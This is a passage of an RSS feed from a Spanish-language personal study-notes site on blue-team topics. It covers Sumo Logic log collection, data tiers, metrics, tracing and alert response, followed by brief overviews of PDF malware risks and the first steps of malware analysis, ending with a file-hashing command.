<br>Es muy importante tener en cuenta todos estos factores a la hora de elegir la estrategía más adecuada para el cliente, por lo que nos puede ser util tener un cuadro como el siguiente en la cabeza a la hora de este tipo de desiciones.<br><img alt="choosign_deployment_strategy_sumologic.png" src="https://dobliuw.com/lib/media/choosign_deployment_strategy_sumologic.png">]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/blueteam/defensive-tools/sumo-logic/1.-sumo-logic-&amp;-estrategía-de-recolección-de-datos.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/BlueTeam/Defensive Tools/Sumo Logic/1. Sumo Logic &amp; Estrategía de Recolección de datos.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Fri, 22 Dec 2023 23:20:58 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/choosign_deployment_strategy_sumologic.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/choosign_deployment_strategy_sumologic.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[2. Collectors, Sources & Metadata]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:blue" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#blue</a> <a class="tag" href="https://dobliuw.com/?query=tag:basico" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#basico</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:blue" class="tag" target="_blank" rel="noopener nofollow">#blue</a> <a href="https://dobliuw.com?query=tag:basico" class="tag" target="_blank" rel="noopener nofollow">#basico</a>
<br><br><br>Como vimos anteriormente en <a data-href="1. Sumo Logic &amp; Estrategía de Recolección de datos" href="https://dobliuw.com/notes/4.-cybersecurity/blueteam/defensive-tools/sumo-logic/1.-sumo-logic-&amp;-estrategía-de-recolección-de-datos.html" class="internal-link" target="_self" rel="noopener nofollow">1. Sumo Logic &amp; Estrategía de Recolección de datos</a>, los collectors son un pequeño software encargado de envíar datos al backend de Sumo Logic. Pero existen dos tipos de Collectors y es importante saber elegir de manera correcta.<br>
<br>

Estos collectors son hosteados por Sumo Logic, es "sin agentes", es decir, no requiere software a instalar o activar en el sistema a proteger, aloja fuentes para recopilar sin probelma desde AWS, Google y productos de Microsoft. A su vez puede recibir logs y metricas subidas vía URL.
<br><img alt="hosted_collector_overview.png" src="https://dobliuw.com/lib/media/hosted_collector_overview.png"><br>
<br>

Estos collectors son instalados en el sistema de manera local o remota, la fuente de la data recolectada tiene que estar disponible en el sistema instalado y es fácil de solucionar probelmas según los registros.
<br><img alt="install_collectors.png" src="https://dobliuw.com/lib/media/install_collectors.png"><br>Es importante tener en cuenta que desde el directorio instalado tenemos acceso a /logs en donde ante cualquier problema de memoria podremos recurrir al archivoi collector.log. <br>
<br>

Open Telemetry es un estándar único de código abierto y un conjunto de tecnologías para capturar y exportar métricas, seguimientos y registros desde una infraestructura y aplicaciones nativas de la nube.
<br><img alt="open_telemetry_workout.png" src="https://dobliuw.com/lib/media/open_telemetry_workout.png"><br>
El Collector Open Telemetry es un collector de "siguiente generación" desarrollado en Open Telemetry que provee un único agente unificado para eviar registros, métricas, seguimientos y metadatos para la observabilidad a Sumo Logic. Esto puede ayudar a simplificar y agilizar el proceso de monitoreo y comprensión del rendimiento y el comportamiento de sistemas distribuidos comlejos. Esto facilita la identificación y el diagnóstico de propbelmas, así como también mejora la confiabilidad y eficiencia general del sistema. <br>Los tres principales componentes de Open Telemetry son:<br>
<br>


<br>


<br>

También otros como:

<br>


<br>

Por último, lo que es importante destacar es que es portable (Un único framework para TODA la observación de datos), ofrece control (Nos pone a cargo de nuestros datos) y cuenta con soporte. 

<br><br><br>Source es la configuración de los logs a recolectar y las metricas. Es decir el "código" que utilizaran los collectors, estos determinan que métricas y logs se capturaran.<br>
<br>

Los sources para instalar en collectors de tipo Installed pueden ser de archivos (Locales o remotos), eventos de Windows, Docker, métricas de Host (CPU, memoria y otras métricas), métricas de Streaming.
<br><img alt="sources_for_installed_collectors.png" src="https://dobliuw.com/lib/media/sources_for_installed_collectors.png"><br>
<br>

Los sources para instalar en collectors de tipo Hosted pueden ser para AWS (S3, Elastic Load Balancing, CloudFront, etc), por otro lado, también existen sources para API's en la nube como, O365, Cloud Syslog, G  Suite Apps Audit, http, etc.
<br><img alt="sources_for_hosted_collectors.png" src="https://dobliuw.com/lib/media/sources_for_hosted_collectors.png"><br><br><br>La metadata proviene de su traducción literal (Sobre datos), son datos que describen otros datos. En general un grupo de metadatos se refiere a un grupo de datos qeu describen el contenido informativo de un objetivo al que se denomina recurso. El concepto de metadatos es análogo al uso de ínidices para localizar objetos en vez de datos.<br>Así mismo, Sumo Logic, también cuenta con metadata a la hora de recibir los datos recopilados por los Collectors y los Sources. La metadata suele estar representada en metadata fields, por ejempo la siguiente tabla muestra los 5 principales "name_tag". <br><img alt="5_firts_meta_fields.png" src="https://dobliuw.com/lib/media/5_firts_meta_fields.png"><br>
Así mismo existen otros metadata_fields, con diferentes name_tags:<br><img alt="more_metadata_fields.png" src="https://dobliuw.com/lib/media/more_metadata_fields.png"><br>
Logícamente estos metadata fields así como keywords pueden ser utilizadas para búesquedas específicas y avanzadas en Sumo Logic.<br><br>
<br>


<br>


<br>


<br>

Ejemplo:
<br>_sourceCategory=value1 AND (_size=1* OR _format=value2)]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/blueteam/defensive-tools/sumo-logic/2.-collectors,-sources-&amp;-metadata.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/BlueTeam/Defensive Tools/Sumo Logic/2. Collectors, Sources &amp; Metadata.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Fri, 22 Dec 2023 23:20:54 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/hosted_collector_overview.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/hosted_collector_overview.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[3. Ingestión de Datos y Niveles de Datos]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:blue" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#blue</a> <a class="tag" href="https://dobliuw.com/?query=tag:basico" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#basico</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:blue" class="tag" target="_blank" rel="noopener nofollow">#blue</a> <a href="https://dobliuw.com?query=tag:basico" class="tag" target="_blank" rel="noopener nofollow">#basico</a>
<br><br><br>Los Ingest Budget controlan la capacidad de inserción de volumen diaria, el limite diario de la capacidad de logs o la capacidad de busqueda dejando de enviar o retener datos. <br>Los Ingest Budget son de ayuda debido a que ingestan datos de manera uniforme, monitorean el consumo exesivo y se comparte el costo.<br>También es importante tener en cuenta que existe varías maneras de asignar un Ingest Budget a un Collector, tanto desde la configuración del collector, como haciendo uso de la página en la parte de Collection, usando los parametros de campo con la Collector Management API o incluso desde CLI (Command Line Interface).<br><img alt="Ingest_budgets_to_collector.png" src="https://dobliuw.com/lib/media/ingest_budgets_to_collector.png"><br><br><br>Data Tiers provee una solución comprensiva para todos los tipos de data que tiene una organización. Estas nos provee un precio tier-based en el plan de uso de la data que se ingesta.<br>
Cada Sumo Logic Data Tier soporta un caso diferente de uso y proporciona su propio conjunto de caractrísticas y capacidades.<br>
<br>


<br>


<br>


<br><img alt="data_tiers.png" src="https://dobliuw.com/lib/media/data_tiers.png"><br>
Los conjuntos de datos empresariales difieren en muchas dimensiones.<br><img alt="enterprise_data_.png" src="https://dobliuw.com/lib/media/enterprise_data_.png"><br>
Elegir el nivel de datos según la frecuencia con la que se accede a estos es super importante, así mismo, para asegurarnos de que los datos se muevan a las particiones adecuadas...<br>
1. Crear las reglas de extracción de camos adecuados para acelerar el proceso de búesqueda analizando lso campos a medida que se incorporan los mensajes de registro después de la recopilación.<br>
2. Configurar particiones para ayudar a enrutar los datos aporpiados a particiones relevantes en niveles relevantes.<br>Toda la data que ingresa a Sumo Logic es dirigida al nivel continuo de manera default y solo la data que es asignada a una partiación pueden ir al nivel Frecuente o Poco Frecuente.<br>
Es importante tener en cuenta las siguientes pautas a la hora de planificar el us ode niveles de datos:<br>
<br>


<br>


<br>


<br><br><br>Una dashboard es una herramienta de gestión de la información que monitoriza, analiza y muestra de manera visual los indicadores clave de desempeño, métricas y datos fundamentales para hacer un seguimiento del estado de una empresa, un departamento, uan campañaa o un proceso escpecífico.<br>En Sumo Logic existen diferentes tipos de dashboards.<br>
<br>


<br>


<br>


<br>


<br><br>La aplicación Infrecuent Data Tier proporciona visibilidad del uso y los costos asociados con los datos almacenados con paneles  preconfigurados visualmente intuitivos. Sumo Logic Infrequent Data Tier solo está disponible para clientes de Enterprise Suite.<br><br><br>El "Modificador de búsqueda _dataTier" es una etiqueta que proporciona información al sistema sobre cómo procesar una consulta. este modificador se utiliza para indicar en qué nivel de deatos debe ejecutarse una consulta: Continuo, Frecuente o Poco Frecuente.<br>
Cuando se inlcuye el modificador _dataTier en una consulta, esta se ejecutará solo en el nivel de datos especificado. Si no se especifican una o más paraticiones en la consulta utilizando _index, la consulta se ejecutará en todas las particiones del nivel de daatos especificado con _dataTier.<br>
Es importante destacar que _dataTier es un nombre reservado en Sumo Logic y no se puede saignar a un canmpo ni utilizarlo en una expresión de extracción de campo.<br>
Un ejemplo de consulta utilizando _dataTier es _dataTier="Infrequent error", que buscará mensajes dque contengan la cadena "error" en todas las particiones del nivel de datos Infrequent, así como en el nivel Continuous y en partción específica llamada InfreqPart en el nivel Infrequent.<br>
<br>


<br>


]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/blueteam/defensive-tools/sumo-logic/3.-ingestión-de-datos-y-niveles-de-datos.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/BlueTeam/Defensive Tools/Sumo Logic/3. Ingestión de Datos y Niveles de Datos.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:34:29 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/ingest_budgets_to_collector.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/ingest_budgets_to_collector.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[4. Data Search (Métricas, Tracing)]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:blue" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#blue</a> <a class="tag" href="https://dobliuw.com/?query=tag:basico" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#basico</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:blue" class="tag" target="_blank" rel="noopener nofollow">#blue</a> <a href="https://dobliuw.com?query=tag:basico" class="tag" target="_blank" rel="noopener nofollow">#basico</a>
<br><br><br>El analísis de logs es super importante para poder detectar posibles ataques, fallas, etc. Entendiendo esta importancia del analísis de logs, se presentan 3 nuevos conceptos o funcionalidades muy importantes, LogReduce, LogCompare y LogReduce By.<br>
<br>

Esta funcionalidad ayuda areducir la cantidad de registros de registro (Logs) para que los equipos de operaciones y seguridad puedan identificar probelmas más fácilmente. Utiliza algoritmos avanzados para agrupar y resumir logs similares en categrías, lo qeu simplifica la visualización y el análisis de grandes volúmenes de datos de registro.

<br>

Esta funcionalidad permite a los usuarios comparar dos conjuntos de registros en Sumo Logic para identificar diferencias o similitudes entre ellos. Se puede cargar dos conjuntos de registros y tuilizar filtros y consultas para resaltar las diferencias o similitues en términos de eventos, campos o valores específicos.

<br>

Esta funcionalidad es una extensión de la función LogReduce que permite a alos usuarios aplicar el proceso de reducción de registros a conjuntos de registros específicos basados en criterios definidos por el usuario. Permite agrupar registros según campos o valores específicos antes de aplicar la reducción, lo que brinda un mayor control sobre cómo se simplifican los datos. 

<br>Si bien todas estas funcionalidades están como "botones" en la página de Sumo Logic por detrás lo que sucede es que se agregan la siguiente sentencia al final de la query:<br>
<br>


<br>


<br>


<br><br><br>Las métricas en Sumo Logic son datos cuantitativos que representan el rendimiento o el estado de un aplicación, sistema o recurso. Estas métricas se recopilan y registran en intervalos regulares, lo que permite el seguimiento y la visualización de tendencias y cambios a lo largo del tiempo.<br>
A diferencia de los logs, los logs conitnene registros textuales descriptivos qeu detallane eventos y actividades, mientras que las métricas son valores numéricos que reflejan mediciones cuantitativas, como el uso de CPU, el uso de memoria o la veolicidad de respuiesta de una aplicación. Además los logs se generan cunado ocurren eventes específicos, mientras que las métricas se recopila a intervalores regualres, como cada minuto o cada segundo. <br><img alt="why_metrics_are_important.png" src="https://dobliuw.com/lib/media/why_metrics_are_important.png"><br>Las métricas son ideales para el monitoreo en tiempo real y la detección temprana de problemas, ya que ofrecen una visión instantánea del estado de los sistemas.<br>Entendiendo esto podemos decir que las métricas son importantes por los siguientes aspectos:<br>
<br>


<br>


<br>


<br>


<br>En resumen las métricas son datos que complementan a los logs al proporcionar uan visión numérica y en tiempo real del rendimiento y el e stado de los sistemas.<br><img alt="logs_metrics.png" src="https://dobliuw.com/lib/media/logs_metrics.png"><br><br><br>La Observabilidad en Sumo Logic se refiere a la capacidad de supervisar, rastrear y analizar de manera integral el rendimiento y el estado de las aplicaciones ys sistemas. Es decir monitorear es la clave para evitar posibles fallas en aplicaciones.<br><img alt="observability_pilars.png" src="https://dobliuw.com/lib/media/observability_pilars.png" style="width: 600px; max-width: 100%;"><br>
Por lo tanto entendemos que los tres pilares de la Observabilidad constan de los logs, métricas y tracing, pero... Que es el tracing?<br><br><br>Transaction Tracing es una funcionalidad de Sumo Logic que permite rastrear y visualizar el flujo de una transacción a través de múltiples componentes de una aplicación. Captura datos detallados sobre cada paso de la transacción, incluidos los tiempos de respuesta, errores y dependencias entre servicios.<br><img alt="transaction_traces_sumo_logic.png" src="https://dobliuw.com/lib/media/transaction_traces_sumo_logic.png" style="width: 1250px; max-width: 100%;"><br>El tracing cumple un importante rol en la solución de observabilidad, sobre todo en aplicaciones basadas en microservicios. Esta funcionalidad nos brinda ciertas ventajas para que esto sea así:<br>
<br>


<br>


<br>


<br>


<br><img alt="tracing_important.png" src="https://dobliuw.com/lib/media/tracing_important.png"><br>Resumiento, el Transaction Tracing en Sumo Logic es una herramienta vital para la observabilidad en aplicaciones modernas, especialmente en entornos basados en microservicios. proporciona visibilidad detallada, facilita la solución de probelmas, mejora el rendimiento y ayuda a comprender las complejas interacciones entre componentes, lo que contribuye a mantener aplicaciones altamanete disponibles y eficientes.<br><img alt="monitoring_sumo_logic.png" src="https://dobliuw.com/lib/media/monitoring_sumo_logic.png"><br>]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/blueteam/defensive-tools/sumo-logic/4.-data-search-(métricas,-tracing).html</link><guid isPermaLink="false">Notes/4. Cybersecurity/BlueTeam/Defensive Tools/Sumo Logic/4. Data Search (Métricas, Tracing).md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Fri, 22 Dec 2023 23:20:48 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/why_metrics_are_important.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/why_metrics_are_important.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Alert Response]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> <a class="tag" href="https://dobliuw.com/?query=tag:blue" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#blue</a> <a class="tag" href="https://dobliuw.com/?query=tag:basico" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#basico</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> <a href="https://dobliuw.com?query=tag:blue" class="tag" target="_blank" rel="noopener nofollow">#blue</a> <a href="https://dobliuw.com?query=tag:basico" class="tag" target="_blank" rel="noopener nofollow">#basico</a>
<br><br><br>La respuesta de alertas es una herramienta que brinda beneficiios claves en la gestión de incidentes. Los ingenieros de guardia se encargar de abordar probelmas de producción de manera eficaz y rápida<br><img alt="alert_response.png" src="https://dobliuw.com/lib/media/alert_response.png"><br>
Para investigar los problemas ocacionados, los ingenieros deben comprender la estructura del sistema, identificar causas y efectos, así como saber qué componentes abordar. También necesitan localizar información relevante, identificar las herramientas necesarias y utilizaar consultas ad-hoc para obtener datos específicos. La correlación manual de cambios y picos es comlicada y requiere experiencia.<br>
<br>

La respuesta a alertas proporciona información contextual sobre las alertas activadas, lo que reduce el tiempo necesario para investigar y resolver fallos de aplicaciones.

<br>

La respuesta a alertas ofrece dos tipos de información para facilitar la identificación de la causa raíz de un problema:

<br>


<br>

Al recopilar datos relevantes de alertas anteriores y analizar patrones en registros y métricas, la respuesta a alertas permite a los ingenieros reducir el tiempo empleado en reunir informacion de diversas fuentes durante un incidente y acelerar la recuperación al proporcionar información curcial para la resolución de problemas.

<br><br><br>Cuando hacemos uso de la respuesta de alertas en Sumo Logic, nos encontramos con un apartado denominado Context Cards, las cuales nos proveen información adicional sobre información interesantes en el sistema que se ha descubierto automáticamente al analizar los datos conseguidos.<br>
Segun el tipo de datos en los que se basó la alerta, métrcias o registros, veremos diferentes Context Cards como fluctuacón, registros, anomalías, explicación dimensional y puntos de referencia.<br>
<br>


<br>


<br>


<br>

Para terminar de entender la estructura de las tarjetas de contexto y la información que se muestra en ellas, es bueno comprender primero la anatomía básica de la tarjeta. Existen cuatro secciones principales idenficiadas en estas:

<br>


<br>


<br>


<br>


<br><br>
<br>

La Log Flunctuation Card detecta diferentes firmas, como erroes y excepciones, en sus mensajes de registro utilizando la misma tecnología que también impulsa la funcionalidad de LogCompare. compara las tendencias de las firmas de registros con un período de referencias normal y muestra cambios notables en las tendencias de las firmas. Estas tendencias se clasifican como New(Nuevas), Gone(Desaparecidas) o Diff(Diferidas)

<br>


<br>


<br>

Es importante recordar que esta tarjeta solo funcionará con Log Monitors y que no se representa para monitores controlados por métricas.

<br>

La Anomaly Card detecta anomalías llamadas eventos de interés (EOI - Events Of Interest) a partir de métricas enviadas a Sumo Logic utilizando la técnología Root Cause Explorer. Luego muestra las EOI que podrían estar relacionadas con la alerta.<br>
Las EOI se agrupan en seis tipos diferentes (Cuatro de ellas denominadas Golden Signals y luego Success y Availability). Esta tarjeta también proporciona un resumen de las EOI que pertenecen a cada grupo. Las EOI también se presentan en una vista de línea de tiempo según cuándo se detectaron y cuánto tiempo han estado presentes. Puede pasar el cursos sobre una EOI para ver información clave sobre el evento.<br>
Es importante recordar que esta tarjeta detecta anomalías en series temporales de entidades relacionadas con la alerta y que solo aparecen en la tarjeta las anomalías con una hora de inicio de a proximadamente 30 minutos, antes o después de que se creara la alerta.

<br>

En la Dimensional Explanation Card el sistema analiza los datos de registro y las dimensiones de las superficies o pares key-value que lo llevan a un estado de alerta. 

<br>

En la Benchmark Card el sistema calcula anomalías en los datos métricos en comparación con los datos de telemetría anónimos y agregados de los cielntes de Sumo Logic en dominios como AWS. Si los datos de la entidad durante un períodod de alerta son inusuales en comparacion con los puntos de referencia, es posbile que haya un cambio de configuración inusual u otros problemas de backend.

<br><br><br><br>Para aplicaciones distrubuidas complejas a gran escala, se necesita una manera fácil y efectiva de administrar ya ctualizar las definiciones de monitoreo, ya que als aplicaciones evolucionan constantemente con cada cambio de código y confimación de Git.<br>
Por ejemplo, si tuvieramos que monitorear una aplicación web distribuida con 20 microservicios. Se deben monitorear cada uno de los 20 microservicios, por lo que uno podría pensar en conifugrar algunos monitores de alertas, para simplificar las cosas y reducir la "tralla", se decide monitorear solo el conjunto estándar de cuatro métricas conocidas como señales doradas:<br>
<br>


<br>


<br>


<br>

Esto hace un total de 80 deficiniones de monitor que necesitamos manejar, es decir 20 microservicios * 4 monitors por servicio. Ahora bien... que pasa si decidimos realizar cambois en el formato del registro para agregar o eliminar atributos? Ese cambio requeriría qeu se actualizen las 80 definicones de monitor y conllevaría un monton de trabajo...
<br>En estos casos es donde nos interesa conocer acerca de Alert Grouping, Sumo Logic brinda a travez de esta funcionalidad una forma de hacer este tipo de trabajos más sensillo, teniendo que crear solo cuatro definiciones de moinitor par realizar un seguimiento de las cuatro métricas doradas en lugar de configurar una por microservicio.<br>Sin Alert Grouping: <br><img alt="without_alert_grouping.png" src="https://dobliuw.com/lib/media/without_alert_grouping.png"><br>
Con Alert Grouping:<br><img alt="alert_grouping.png" src="https://dobliuw.com/lib/media/alert_grouping.png"><br>
Entonces, el Alert Grouping es una capacidad que permite crear un único monitor y resolver más de una alerta según condiciones específicas. Esta funcionalidad es imporatnte ya que hoy en día, todas las organizacione depende de aplicaciones clave que se ejecutan en entornos complejos de múltiples nubes para realizar transacciones comerciales y permititr que los usuarios trabajen. Es fundamental garantizar que esas aplicaciones se ejecute de manera óptima. Se requiere un sistema sólido de monitoreo y alerta para saber cuándo un problema necesita atención.<br>Existen tres escenarios posibles en Sumo Logic para la generación de alertas desde un monitor.<br>
<br>


<br>


<br>


]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/blueteam/defensive-tools/sumo-logic/5.-alert-response.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/BlueTeam/Defensive Tools/Sumo Logic/5. Alert Response.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Fri, 22 Dec 2023 23:20:50 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/alert_response.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/alert_response.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Malware analysis in PDF's]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> <a class="tag" href="https://dobliuw.com/?query=tag:blue" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#blue</a> <a class="tag" href="https://dobliuw.com/?query=tag:basico" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#basico</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> <a href="https://dobliuw.com?query=tag:blue" class="tag" target="_blank" rel="noopener nofollow">#blue</a> <a href="https://dobliuw.com?query=tag:basico" class="tag" target="_blank" rel="noopener nofollow">#basico</a>
<br><br><br>Un Portable Document Format es un formato de almacenamiento para documentos digitales independientes de plataformas de software o hardware.<br><br><br>A la hora de descargar o abrir PDF's existen riesgos de quedar infectados, descargar malware terminando la misma en <a data-href="RCE - (Remote Command Execution)" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/rce-(remote-command-execution).html" class="internal-link" target="_self" rel="noopener nofollow">RCE - (Remote Command Execution)</a> para el actor o realizar acciones que no esperabamos realizar. <br><br>
<br>


<br>


<br><br>
<br>


<br>


<br><br>
<br>


<br><br>Los PDFS pueden ser alterados para mostrar contenido difrenciado o de marca, engañando a los usuarios para que piensen que están interactuando con un documento legítimo. Los atacantes pueden crear PDFs con firmas digitales o certificaciones falsas para aparentar confiabilidad. <br><br>Información sensible dentro de un PDF, como lso envíos de formularios, puede ser extraída por un atacante si las medidas de seguridad no son las adecuadas. Los PDFs también contiene metadata que revela información acerca de la craeción y deción del documento, la cual puede ser aprovechada en ataques. <br><br>Nuevas vulnerabilidades en el software de PDF pueden surgir, las cuales los atacntes pueden usar antes de que los parches adecuados estén disponibles.<br><br>Los atacntes pueden modificar el contenido o la metadata del documento para crear un PDF fraudulento. Además, las discrepancias entre las versiones del PDF pueden llevar a rpoblemas de renderizado y aposibles vulnerabilidades explotables. <br><br>Los PDFs protegidos por contraseña pueden tener una débil ofácl de adivinar, haciéndolos susceptibles a acceso no autorizado.<br><br>Los PDFs pueden ser manipulados para recolectar información sensible de los usuarios y ejecutar actividades maliciosas.<br><br>Un atacante puede ofuscar malware dentro del contenido de un PDF, haciéndolo difícil de detectar. Las técnicas esteganográficas pueden ser usadas para escondar código o información dentro de un PDF<br><br><br><br>
<br>


<br>


<br>


<br><br>
<br>


<br>


<br>


<br>


<br><br>
<br>


<br>


<br>


<br>


<br>


<br>


]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/blueteam/malware-analysis/pdf/malware-analysis-in-pdf&apos;s.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/BlueTeam/Malware Analysis/PDF/Malware analysis in PDF&apos;s.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:34:30 GMT</pubDate></item><item><title><![CDATA[Análisis de Malware]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> <a class="tag" href="https://dobliuw.com/?query=tag:blue" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#blue</a> <a class="tag" href="https://dobliuw.com/?query=tag:analysis" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#analysis</a> <a class="tag" href="https://dobliuw.com/?query=tag:malware" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#malware</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> <a href="https://dobliuw.com?query=tag:blue" class="tag" target="_blank" rel="noopener nofollow">#blue</a> <a href="https://dobliuw.com?query=tag:analysis" class="tag" target="_blank" rel="noopener nofollow">#analysis</a> <a href="https://dobliuw.com?query=tag:malware" class="tag" target="_blank" rel="noopener nofollow">#malware</a>
<br><br><br>Una vez configurado nuestro <a data-href="Setup Analysis Enviroment" href="https://dobliuw.com/notes/4.-cybersecurity/blueteam/malware-analysis/sistem/setup-analysis-enviroment.html" class="internal-link" target="_self" rel="noopener nofollow">Setup Analysis Enviroment</a>, podemos comenzar con el análisis de malware, pero primero, ¿Que es? El análisis de malware es el proceso de examinar el comportamiento y la estrucutra del software malicosos para comprender su funcionalidad, cómo actúa en un sistema y cómo se propaga. Esto permite desarrollar medidas para su detección, eliminación y prevención.<br><br><br>El Análisis Estático se enfoca en estudiar el malware sin ejecutarlo. Incluye la inspección de código, la estructura del archivo, metadatos y otras características sin avtivar su funcionamiento.<br>Por otro lado, el Análisis Dinámico implica ejecutar el malware en un entorno controaldo y observar su comportamiento en tiempo de ejecución.<br><br><br>Una de las primeras cosas que podemos hacer es obtener hashes (md5sum, sha256) para verificar posibles existencias de este malware, en caso de que estemos ante un malware potencialmente conocido, mediante la obtención de estos hashes podríamos verificar en herramientas como <a data-tooltip-position="top" aria-label="https://www.virustotal.com/gui/home/upload" rel="noopener nofollow" class="external-link" href="https://www.virustotal.com/gui/home/upload" target="_blank">VirusTotal</a> u otras, la existencia y detección de motores de anti virus respecto a este hash.<br>Para obtener este hash podríamos hacer uso de los siguientes comandos de PowerShell:<br>Get-FileHash {file_to_get_the_hash}
